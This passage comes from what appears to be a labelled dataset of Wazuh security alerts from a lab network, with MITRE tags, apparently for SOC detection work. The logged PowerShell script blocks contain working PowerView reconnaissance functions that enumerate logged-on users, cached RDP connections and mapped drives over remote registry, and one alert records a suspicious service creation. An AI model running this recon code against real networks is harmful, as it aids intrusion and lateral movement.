"3420", "severityValue": "WARNING", "providerName": "Microsoft-Windows-PowerShell"}}}, "rule": {"firedtimes": 7, "mail": true, "description": "Powershell script used \"Invoke-command\" cmdlet to execute code on remote computer", "groups": ["windows", " powershell"], "mitre": {"technique": ["PowerShell", "Windows Remote Management"], "id": ["T1059.001", "T1021.006"], "tactic": ["Execution", "Lateral Movement"]}, "id": "91823"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751802789.15278067", "timestamp": "2025-07-06T11:53:09.440+0000"}, "fields": {"timestamp": ["2025-07-06T11:53:09.440Z"]}, "sort": [1751802789440]}}
{"id": "CwqV35cBiGYaRV9XQ66b", "description": "Powershell queried Win32_Process. Possible process discovery activity", "label": "TP", "rule_level": 4, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.06", "_id": "CwqV35cBiGYaRV9XQ66b", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"messageNumber": "39", "messageTotal": "51", "scriptBlockText": "            Write-Warning \\\"[Get-WMIRegProxy] No proxy settings found for $ComputerName\\\"                 }             }             catch {                 Write-Warning \\\"[Get-WMIRegProxy] Error enumerating proxy settings for $ComputerName : $_\\\"             }         }     } }   function Get-WMIRegLastLoggedOn { &lt;# .SYNOPSIS  Returns the last user who logged onto the local (or a remote) machine.  Note: This function requires administrative rights on the machine you're enumerating.  Author: Will Schroeder (@harmj0y)   License: BSD 3-Clause   Required Dependencies: None    .DESCRIPTION  This function uses remote registry to enumerate the LastLoggedOnUser registry key for the local (or remote) machine.  .PARAMETER ComputerName  Specifies the hostname to query for remote registry values (also accepts IP addresses). Defaults to 'localhost'.  .PARAMETER Credential  A [Management.Automation.PSCredential] object of alternate credentials for connecting to the remote system.  .EXAMPLE  Get-WMIRegLastLoggedOn  Returns the last user logged onto the local machine.  .EXAMPLE  Get-WMIRegLastLoggedOn -ComputerName WINDOWS1  Returns the last user logged onto WINDOWS1  .EXAMPLE  Get-DomainComputer | Get-WMIRegLastLoggedOn  Returns the last user logged onto all machines in the domain.  .EXAMPLE  $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\\\dfm.a', $SecPassword) Get-WMIRegLastLoggedOn -ComputerName PRIMARY.testlab.local -Credential $Cred  .OUTPUTS  PowerView.LastLoggedOnUser  A PSCustomObject containing the ComputerName and last loggedon user. #&gt;      [OutputType('PowerView.LastLoggedOnUser')]     [CmdletBinding()]     Param(         [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]         [Alias('HostName', 'dnshostname', 'name')]         [ValidateNotNullOrEmpty()]         [String[]]         $ComputerName = 'localhost',          [Management.Automation.PSCredential]         [Management.Automation.CredentialAttribute()]         $Credential = [Management.Automation.PSCredential]::Empty     )      PROCESS {         ForEach ($Computer in $ComputerName) {             # HKEY_LOCAL_MACHINE             $HKLM = 2147483650              $WmiArguments = @{                 'List' = $True                 'Class' = 'StdRegProv'                 'Namespace' = 'root\\\\default'                 'Computername' = $Computer                 'ErrorAction' = 'SilentlyContinue'             }             if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }              # try to open up the remote registry key to grab the last logged on user             try {                 $Reg = Get-WmiObject @WmiArguments                  $Key = 'SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Authentication\\\\LogonUI'                 $Value = 'LastLoggedOnUser'                 $LastUser = $Reg.GetStringValue($HKLM, $Key, $Value).sValue                  $LastLoggedOn = New-Object PSObject                 $LastLoggedOn | Add-Member Noteproperty 'ComputerName' $Computer                 $LastLoggedOn | Add-Member Noteproperty 'LastLoggedOn' $LastUser                 $LastLoggedOn.PSObject.TypeNames.Insert(0, 'PowerView.LastLoggedOnUser')                 $LastLoggedOn             }             catch {                 Write-Warning \\\"[Get-WMIRegLastLoggedOn] Error opening remote registry on $Computer. Remote registry likely not enabled.\\\"             }         }     } }   function Get-WMIRegCachedRDPConnection { &lt;# .SYNOPSIS  Returns information about RDP connections outgoing from the local (or remote) machine.  Note: This function requires administrative rights on the machine you're enumerating.  Author: Will Schroeder (@harmj0y)   License: BSD 3-Clause   Required Dependencies: ConvertFrom-SID    .DESCRIPTION  Uses remote registry functionality to query all entries for the \\\"Windows Remote Desktop Connection Client\\\" on a machine, separated by user and target server.  .PARAMETER ComputerName  Specifies the hostname to query for cached RDP connections (also accepts IP addresses). Defaults to 'localhost'.  .PARAMETER Credential  A [Management.Automation.PSCredential] object of alternate credentials for connecting to the remote system.  .EXAMPLE  Get-WMIRegCachedRDPConnection  Returns the RDP connection client information for the local machine.  .EXAMPLE  Get-WMIRegCachedRDPConnection  -ComputerName WINDOWS2.testlab.local  Returns the RDP connection client information for the WINDOWS2.testlab.local machine  .EXAMPLE  Get-DomainComputer | Get-WMIRegCachedRDPConnection  Returns cached RDP information for all machines in the domain.  .EXAMPLE  $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\\\dfm.a', $SecPassword) Get-WMIRegCachedRDPConnection -ComputerName PRIMARY.testlab.local -Credential $Cred  .OUTPUTS  PowerView.CachedRDPConnection  A PSCustomObject containing the ComputerName and cached RDP information. #&gt;      [OutputType('PowerView.CachedRDPConnection')]     [CmdletBinding()]     Param(         [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]         [Alias('HostName', 'dnshostname', 'name')]         [ValidateNotNullOrEmpty()]         [String[]]         $ComputerName = 'localhost',          [Management.Automation.PSCredential]         [Management.Automation.CredentialAttribute()]         $Credential = [Management.Automation.PSCredential]::Empty     )      PROCESS {         ForEach ($Computer in $ComputerName) {             # HKEY_USERS             $HKU = 2147483651              $WmiArguments = @{                 'List' = $True                 'Class' = 'StdRegProv'                 'Namespace' = 'root\\\\default'                 'Computername' = $Computer                 'ErrorAction' = 'Stop'             }             if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }              try {                 $Reg = Get-WmiObject @WmiArguments                  # extract out the SIDs of domain users in this hive                 $UserSIDs = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }                  ForEach ($UserSID in $UserSIDs) {                     try {                         if ($PSBoundParameters['Credential']) {                             $UserName = ConvertFrom-SID -ObjectSid $UserSID -Credential $Credential                         }                         else {                             $UserName = ConvertFrom-SID -ObjectSid $UserSID                         }                          # pull out all the cached RDP connections                         $ConnectionKeys = $Reg.EnumValues($HKU,\\\"$UserSID\\\\Software\\\\Microsoft\\\\Terminal Server Client\\\\Default\\\").sNames                          ForEach ($Connection in $ConnectionKeys) {                             # make sure this key is a cached connection                             if ($Connection -match 'MRU.*') {                                 $TargetServer = $Reg.GetStringValue($HKU, \\\"$UserSID\\\\Software\\\\Microsoft\\\\Terminal Server Client\\\\Default\\\", $Connection).sValue                                  $FoundConnection = New-Object PSObject                                 $FoundConnection | Add-Member Noteproperty 'ComputerName' $Computer                                 $FoundConnection | Add-Member Noteproperty 'UserName' $UserName                                 $FoundConnection | Add-Member Noteproperty 'UserSID' $UserSID                                 $FoundConnection | Add-Member Noteproperty 'TargetServer' $TargetServer                                 $FoundConnection | Add-Member Noteproperty 'UsernameHint' $Null                                 $FoundConnection.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')                                 $FoundConnection                             }                         }                          # pull out all the cached server info with username hints                         $ServerKeys = $Reg.EnumKey($HKU,\\\"$UserSID\\\\Software\\\\Microsoft\\\\Terminal Server Client\\\\Servers\\\").sNames                          ForEach ($Server in $ServerKeys) {                              $UsernameHint = $Reg.GetStringValue($HKU, \\\"$UserSID\\\\Software\\\\Microsoft\\\\Terminal Server Client\\\\Servers\\\\$Server\\\", 'UsernameHint').sValue                              $FoundConnection = New-Object PSObject                             $FoundConnection | Add-Member Noteproperty 'ComputerName' $Computer                             $FoundConnection | Add-Member Noteproperty 'UserName' $UserName                             $FoundConnection | Add-Member Noteproperty 'UserSID' $UserSID                             $FoundConnection | Add-Member Noteproperty 'TargetServer' $Server                             $FoundConnection | Add-Member Noteproperty 'UsernameHint' $UsernameHint                             $FoundConnection.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')                             $FoundConnection                         }                     }                     catch {                         Write-Verbose \\\"[Get-WMIRegCachedRDPConnection] Error: $_\\\"                     }                 }             }             catch {                 Write-Warning \\\"[Get-WMIRegCachedRDPConnection] Error accessing $Computer, likely insufficient permissions or firewall rules on host: $_\\\"             }         }     } }   function Get-WMIRegMountedDrive { &lt;# .SYNOPSIS  Returns information about saved network mounted drives for the local (or remote) machine.  Note: This function requires administrative rights on the machine you're enumerating.  Author: Will Schroeder (@harmj0y)   License: BSD 3-Clause   Required Dependencies: ConvertFrom-SID    .DESCRIPTION  Uses remote registry functionality to enumerate recently mounted network drives.  .PARAMETER ComputerName  Specifies the hostname to query for mounted drive information (also accepts IP addresses). Defaults to 'localhost'.  .PARAMETER Credential  A [Management.Automation.PSCredential] object of alternate credentials for connecting to the remote system.  .EXAMPLE  Get-WMIRegMountedDrive  Returns the saved network mounted drives for the local machine.  .EXAMPLE  Get-WMIRegMountedDrive -ComputerName WINDOWS2.testlab.local  Returns the saved network mounted drives for the WINDOWS2.testlab.local machine  .EXAMPLE  Get-DomainComputer | Get-WMIRegMountedDrive  Returns the saved network mounted drives for all machines in the domain.  .EXAMPLE  $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\\\dfm.a', $SecPassword) Get-WMIRegMountedDrive -ComputerName PRIMARY.testlab.local -Credential $Cred  .OUTPUTS  PowerView.RegMountedDrive  A PSCustomObject containing the ComputerName and mounted drive information. #&gt;      [OutputType('PowerView.RegMountedDrive')]     [CmdletBinding()]     Param(         [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]         [Alias('HostName', 'dnshostname', 'name')]         [ValidateNotNullOrEmpty()]         [String[]]         $ComputerName = 'localhost',          [Management.Automation.PSCredential]         [Management.Automation.CredentialAttribute()]         $Credential = [Management.Automation.PSCredential]::Empty     )      PROCESS {         ForEach ($Computer in $ComputerName) {             # HKEY_USERS             $HKU = 2147483651              $WmiArguments = @{                 'List' = $True                 'Class' = 'StdRegProv'                 'Namespace' = 'root\\\\default'                 'Computername' = $Computer                 'ErrorAction' = 'Stop'             }             if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }              try {                 $Reg = Get-WmiObject @WmiArguments                  # extract out the SIDs of domain users in this hive                 $UserSIDs = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }                  ForEach ($UserSID in $UserSIDs) {                     try {                         if ($PSBoundParameters['Credential']) {                             $UserName = ConvertFrom-SID -ObjectSid $UserSID -Credential $Credential                         }                         else {                             $UserName = ConvertFrom-SID -ObjectSid $UserSID                         }                          $DriveLetters = ($Reg.EnumKey($HKU, \\\"$UserSID\\\\Network\\\")).sNames                          ForEach ($DriveLetter in $DriveLetters) {                             $ProviderName = $Reg.GetStringValue($HKU, \\\"$UserSID\\\\Network\\\\$DriveLetter\\\", 'ProviderName').sValue                             $RemotePath = $Reg.GetStringValue($HKU, \\\"$UserSID\\\\Network\\\\$DriveLetter\\\", 'RemotePath').sValue                             $DriveUserName = $Reg.GetStringValue($HKU, \\\"$UserSID\\\\Network\\\\$DriveLetter\\\", 'UserName').sValue                             if (-not $UserName) { $UserName = '' }                              if ($RemotePath -and ($RemotePath -ne '')) {                                 $MountedDrive = New-Object PSObject                                 $MountedDrive | Add-Member Noteproperty 'ComputerName' $Computer                                 $MountedDrive | Add-Member Noteproperty 'UserName' $UserName                                 $MountedDrive | Add-Member Noteproperty 'UserSID' $UserSID                                 $MountedDrive | Add-Member Noteproperty 'DriveLetter' $DriveLetter                                 $MountedDrive | Add-Member Noteproperty 'ProviderName' $ProviderName                                 $MountedDrive | Add-Member Noteproperty 'RemotePath' $RemotePath                                 $MountedDrive | Add-Member Noteproperty 'DriveUserName' $DriveUserName                                 $MountedDrive.PSObject.TypeNames.Insert(0, 'PowerView.RegMountedDrive')                                 $MountedDrive                             }                         }                     }                     catch {                         Write-Verbose \\\"[Get-WMIRegMountedDrive] Error: $_\\\"                     }                 }             }             catch {                 Write-Warning \\\"[Get-WMIRegMountedDrive] Error accessing $Computer, likely insufficient permissions or firewall rules on host: $_\\\"             }         }     } }   function Get-WMIProcess { &lt;# .SYNOPSIS  Returns a list of processes and their owners on the local or remote machine.  Author: Will Schroeder (@harmj0y)   License: BSD 3-Clause   Required Dependencies: None    .DESCRIPTION  Uses Get-WMIObject to enumerate all Win32_process instances on the local or remote machine, including the owners of the particular process.  .PARAMETER ComputerName  Specifies the hostname to query for cached RDP connections (also accepts IP addresses). Defaults to 'localhost'.  .PARAMETER Credential  A [Management", "scriptBlockId": "a7aa712a-262a-46cc-9182-ebdb9a73fcc3"}, "system": {"eventID": "4104", "keywords": "0x0", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "level": "3", "channel": "Microsoft-Windows-PowerShell/Operational", "opcode": "15", "message": "\"Creating Scriptblock text (39 of 51):\r\n            Write-Warning \"[Get-WMIRegProxy] No proxy settings found for $ComputerName\"\n                }\n            }\n            catch {\n                Write-Warning \"[Get-WMIRegProxy] Error enumerating proxy settings for $ComputerName : $_\"\n            }\n        }\n    }\n}\n\n\nfunction Get-WMIRegLastLoggedOn {\n<#\n.SYNOPSIS\n\nReturns the last user who logged onto the local (or a remote) machine.\n\nNote: This function requires administrative rights on the machine you're enumerating.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: None  \n\n.DESCRIPTION\n\nThis function uses remote registry to enumerate the LastLoggedOnUser registry key\nfor the local (or remote) machine.\n\n.PARAMETER ComputerName\n\nSpecifies the hostname to query for remote registry values (also accepts IP addresses).\nDefaults to 'localhost'.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connecting to the remote system.\n\n.EXAMPLE\n\nGet-WMIRegLastLoggedOn\n\nReturns the last user logged onto the local machine.\n\n.EXAMPLE\n\nGet-WMIRegLastLoggedOn -ComputerName WINDOWS1\n\nReturns the last user logged onto WINDOWS1\n\n.EXAMPLE\n\nGet-DomainComputer | Get-WMIRegLastLoggedOn\n\nReturns the last user logged onto all machines in the domain.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-WMIRegLastLoggedOn -ComputerName PRIMARY.testlab.local -Credential $Cred\n\n.OUTPUTS\n\nPowerView.LastLoggedOnUser\n\nA PSCustomObject containing the ComputerName and last loggedon user.\n#>\n\n    [OutputType('PowerView.LastLoggedOnUser')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('HostName', 'dnshostname', 'name')]\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $ComputerName = 'localhost',\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    PROCESS {\n        ForEach ($Computer in $ComputerName) {\n            # HKEY_LOCAL_MACHINE\n            $HKLM = 2147483650\n\n            $WmiArguments = @{\n                'List' = $True\n                'Class' = 'StdRegProv'\n                'Namespace' = 'root\\default'\n                'Computername' = $Computer\n                'ErrorAction' = 'SilentlyContinue'\n            }\n            if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }\n\n            # try to open up the remote registry key to grab the last logged on user\n            try {\n                $Reg = Get-WmiObject @WmiArguments\n\n                $Key = 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Authentication\\LogonUI'\n                $Value = 'LastLoggedOnUser'\n                $LastUser = $Reg.GetStringValue($HKLM, $Key, $Value).sValue\n\n                $LastLoggedOn = New-Object PSObject\n                $LastLoggedOn | Add-Member Noteproperty 'ComputerName' $Computer\n                $LastLoggedOn | Add-Member Noteproperty 'LastLoggedOn' $LastUser\n                $LastLoggedOn.PSObject.TypeNames.Insert(0, 'PowerView.LastLoggedOnUser')\n                $LastLoggedOn\n            }\n            catch {\n                Write-Warning \"[Get-WMIRegLastLoggedOn] Error opening remote registry on $Computer. Remote registry likely not enabled.\"\n            }\n        }\n    }\n}\n\n\nfunction Get-WMIRegCachedRDPConnection {\n<#\n.SYNOPSIS\n\nReturns information about RDP connections outgoing from the local (or remote) machine.\n\nNote: This function requires administrative rights on the machine you're enumerating.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: ConvertFrom-SID  \n\n.DESCRIPTION\n\nUses remote registry functionality to query all entries for the\n\"Windows Remote Desktop Connection Client\" on a machine, separated by\nuser and target server.\n\n.PARAMETER ComputerName\n\nSpecifies the hostname to query for cached RDP connections (also accepts IP addresses).\nDefaults to 'localhost'.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connecting to the remote system.\n\n.EXAMPLE\n\nGet-WMIRegCachedRDPConnection\n\nReturns the RDP connection client information for the local machine.\n\n.EXAMPLE\n\nGet-WMIRegCachedRDPConnection  -ComputerName WINDOWS2.testlab.local\n\nReturns the RDP connection client information for the WINDOWS2.testlab.local machine\n\n.EXAMPLE\n\nGet-DomainComputer | Get-WMIRegCachedRDPConnection\n\nReturns cached RDP information for all machines in the domain.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-WMIRegCachedRDPConnection -ComputerName PRIMARY.testlab.local -Credential $Cred\n\n.OUTPUTS\n\nPowerView.CachedRDPConnection\n\nA PSCustomObject containing the ComputerName and cached RDP information.\n#>\n\n    [OutputType('PowerView.CachedRDPConnection')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('HostName', 'dnshostname', 'name')]\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $ComputerName = 'localhost',\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    PROCESS {\n        ForEach ($Computer in $ComputerName) {\n            # HKEY_USERS\n            $HKU = 2147483651\n\n            $WmiArguments = @{\n                'List' = $True\n                'Class' = 'StdRegProv'\n                'Namespace' = 'root\\default'\n                'Computername' = $Computer\n                'ErrorAction' = 'Stop'\n            }\n            if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }\n\n            try {\n                $Reg = Get-WmiObject @WmiArguments\n\n                # extract out the SIDs of domain users in this hive\n                $UserSIDs = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }\n\n                ForEach ($UserSID in $UserSIDs) {\n                    try {\n                        if ($PSBoundParameters['Credential']) {\n                            $UserName = ConvertFrom-SID -ObjectSid $UserSID -Credential $Credential\n                        }\n                        else {\n                            $UserName = ConvertFrom-SID -ObjectSid $UserSID\n                        }\n\n                        # pull out all the cached RDP connections\n                        $ConnectionKeys = $Reg.EnumValues($HKU,\"$UserSID\\Software\\Microsoft\\Terminal Server Client\\Default\").sNames\n\n                        ForEach ($Connection in $ConnectionKeys) {\n                            # make sure this key is a cached connection\n                            if ($Connection -match 'MRU.*') {\n                                $TargetServer = $Reg.GetStringValue($HKU, \"$UserSID\\Software\\Microsoft\\Terminal Server Client\\Default\", $Connection).sValue\n\n                                $FoundConnection = New-Object PSObject\n                                $FoundConnection | Add-Member Noteproperty 'ComputerName' $Computer\n                                $FoundConnection | Add-Member Noteproperty 'UserName' $UserName\n                                $FoundConnection | Add-Member Noteproperty 'UserSID' $UserSID\n                                $FoundConnection | Add-Member Noteproperty 'TargetServer' $TargetServer\n                                $FoundConnection | Add-Member Noteproperty 'UsernameHint' $Null\n                                $FoundConnection.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')\n                                $FoundConnection\n                            }\n                        }\n\n                        # pull out all the cached server info with username hints\n                        $ServerKeys = $Reg.EnumKey($HKU,\"$UserSID\\Software\\Microsoft\\Terminal Server Client\\Servers\").sNames\n\n                        ForEach ($Server in $ServerKeys) {\n\n                            $UsernameHint = $Reg.GetStringValue($HKU, \"$UserSID\\Software\\Microsoft\\Terminal Server Client\\Servers\\$Server\", 'UsernameHint').sValue\n\n                            $FoundConnection = New-Object PSObject\n                            $FoundConnection | Add-Member Noteproperty 'ComputerName' $Computer\n                            $FoundConnection | Add-Member Noteproperty 'UserName' $UserName\n                            $FoundConnection | Add-Member Noteproperty 'UserSID' $UserSID\n                            $FoundConnection | Add-Member Noteproperty 'TargetServer' $Server\n                            $FoundConnection | Add-Member Noteproperty 'UsernameHint' $UsernameHint\n                            $FoundConnection.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')\n                            $FoundConnection\n                        }\n                    }\n                    catch {\n                        Write-Verbose \"[Get-WMIRegCachedRDPConnection] Error: $_\"\n                    }\n                }\n            }\n            catch {\n                Write-Warning \"[Get-WMIRegCachedRDPConnection] Error accessing $Computer, likely insufficient permissions or firewall rules on host: $_\"\n            }\n        }\n    }\n}\n\n\nfunction Get-WMIRegMountedDrive {\n<#\n.SYNOPSIS\n\nReturns information about saved network mounted drives for the local (or remote) machine.\n\nNote: This function requires administrative rights on the machine you're enumerating.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: ConvertFrom-SID  \n\n.DESCRIPTION\n\nUses remote registry functionality to enumerate recently mounted network drives.\n\n.PARAMETER ComputerName\n\nSpecifies the hostname to query for mounted drive information (also accepts IP addresses).\nDefaults to 'localhost'.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connecting to the remote system.\n\n.EXAMPLE\n\nGet-WMIRegMountedDrive\n\nReturns the saved network mounted drives for the local machine.\n\n.EXAMPLE\n\nGet-WMIRegMountedDrive -ComputerName WINDOWS2.testlab.local\n\nReturns the saved network mounted drives for the WINDOWS2.testlab.local machine\n\n.EXAMPLE\n\nGet-DomainComputer | Get-WMIRegMountedDrive\n\nReturns the saved network mounted drives for all machines in the domain.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-WMIRegMountedDrive -ComputerName PRIMARY.testlab.local -Credential $Cred\n\n.OUTPUTS\n\nPowerView.RegMountedDrive\n\nA PSCustomObject containing the ComputerName and mounted drive information.\n#>\n\n    [OutputType('PowerView.RegMountedDrive')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('HostName', 'dnshostname', 'name')]\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $ComputerName = 'localhost',\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    PROCESS {\n        ForEach ($Computer in $ComputerName) {\n            # HKEY_USERS\n            $HKU = 2147483651\n\n            $WmiArguments = @{\n                'List' = $True\n                'Class' = 'StdRegProv'\n                'Namespace' = 'root\\default'\n                'Computername' = $Computer\n                'ErrorAction' = 'Stop'\n            }\n            if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }\n\n            try {\n                $Reg = Get-WmiObject @WmiArguments\n\n                # extract out the SIDs of domain users in this hive\n                $UserSIDs = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }\n\n                ForEach ($UserSID in $UserSIDs) {\n                    try {\n                        if ($PSBoundParameters['Credential']) {\n                            $UserName = ConvertFrom-SID -ObjectSid $UserSID -Credential $Credential\n                        }\n                        else {\n                            $UserName = ConvertFrom-SID -ObjectSid $UserSID\n                        }\n\n                        $DriveLetters = ($Reg.EnumKey($HKU, \"$UserSID\\Network\")).sNames\n\n                        ForEach ($DriveLetter in $DriveLetters) {\n                            $ProviderName = $Reg.GetStringValue($HKU, \"$UserSID\\Network\\$DriveLetter\", 'ProviderName').sValue\n                            $RemotePath = $Reg.GetStringValue($HKU, \"$UserSID\\Network\\$DriveLetter\", 'RemotePath').sValue\n                            $DriveUserName = $Reg.GetStringValue($HKU, \"$UserSID\\Network\\$DriveLetter\", 'UserName').sValue\n                            if (-not $UserName) { $UserName = '' }\n\n                            if ($RemotePath -and ($RemotePath -ne '')) {\n                                $MountedDrive = New-Object PSObject\n                                $MountedDrive | Add-Member Noteproperty 'ComputerName' $Computer\n                                $MountedDrive | Add-Member Noteproperty 'UserName' $UserName\n                                $MountedDrive | Add-Member Noteproperty 'UserSID' $UserSID\n                                $MountedDrive | Add-Member Noteproperty 'DriveLetter' $DriveLetter\n                                $MountedDrive | Add-Member Noteproperty 'ProviderName' $ProviderName\n                                $MountedDrive | Add-Member Noteproperty 'RemotePath' $RemotePath\n                                $MountedDrive | Add-Member Noteproperty 'DriveUserName' $DriveUserName\n                                $MountedDrive.PSObject.TypeNames.Insert(0, 'PowerView.RegMountedDrive')\n                                $MountedDrive\n                            }\n                        }\n                    }\n                    catch {\n                        Write-Verbose \"[Get-WMIRegMountedDrive] Error: $_\"\n                    }\n                }\n            }\n            catch {\n                Write-Warning \"[Get-WMIRegMountedDrive] Error accessing $Computer, likely insufficient permissions or firewall rules on host: $_\"\n            }\n        }\n    }\n}\n\n\nfunction Get-WMIProcess {\n<#\n.SYNOPSIS\n\nReturns a list of processes and their owners on the local or remote machine.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: None  \n\n.DESCRIPTION\n\nUses Get-WMIObject to enumerate all Win32_process instances on the local or remote machine,\nincluding the owners of the particular process.\n\n.PARAMETER ComputerName\n\nSpecifies the hostname to query for cached RDP connections (also accepts IP addresses).\nDefaults to 'localhost'.\n\n.PARAMETER Credential\n\nA [Management\r\n\r\nScriptBlock ID: a7aa712a-262a-46cc-9182-ebdb9a73fcc3\r\nPath: \"", "version": "1", "systemTime": "2025-07-06T11:52:39.1619273Z", "eventRecordID": "11049", "threadID": "4108", "computer": "Win11Client.soclab.internal", "task": "2", "processID": "3420", "severityValue": "WARNING", "providerName": "Microsoft-Windows-PowerShell"}}}, "rule": {"firedtimes": 2, "mail": false, "description": "Powershell queried Win32_Process. Possible process discovery activity", "groups": ["windows", " powershell"], "mitre": {"technique": ["Process Discovery"], "id": ["T1057"], "tactic": ["Discovery"]}, "id": "91841"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751802789.15214768", "timestamp": "2025-07-06T11:53:09.420+0000"}, "fields": {"timestamp": ["2025-07-06T11:53:09.420Z"]}, "sort": [1751802789420]}}
{"id": "Agqs35cBiGYaRV9XU7DQ", "description": "Evidence of new service creation found in registry under HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\XIfn\\\\ImagePath binary is: %%systemroot%%\\\\UbntCfHC.exe", "label": "TP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.06", "_id": "Agqs35cBiGYaRV9XU7DQ", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"image": "C:\\\\WINDOWS\\\\system32\\\\services.exe", "targetObject": "HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\XIfn\\\\ImagePath", "processGuid": "{ff3427f9-51d6-686a-0b00-000000001600}", "processId": "908", "utcTime": "2025-07-06 12:18:13.350", "details": "%%systemroot%%\\\\UbntCfHC.exe", "eventType": "SetValue", "user": "NT AUTHORITY\\\\SYSTEM"}, "system": {"eventID": "13", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2025-07-06 12:18:13.350\r\nProcessGuid: {ff3427f9-51d6-686a-0b00-000000001600}\r\nProcessId: 908\r\nImage: C:\\WINDOWS\\system32\\services.exe\r\nTargetObject: HKLM\\System\\CurrentControlSet\\Services\\XIfn\\ImagePath\r\nDetails: %%systemroot%%\\UbntCfHC.exe\r\nUser: NT AUTHORITY\\SYSTEM\"", "version": "2", "systemTime": "2025-07-06T12:18:13.3525627Z", "eventRecordID": "873117", "threadID": "3716", "computer": "Win11Client.soclab.internal", "task": "13", "processID": "3024", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 1, "mail": false, "description": "Evidence of new service creation found in registry under HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\XIfn\\\\ImagePath binary is: %%systemroot%%\\\\UbntCfHC.exe", "groups": ["sysmon", "sysmon_eid13_detections", "windows"], "mitre": {"technique": ["Windows Service"], "id": 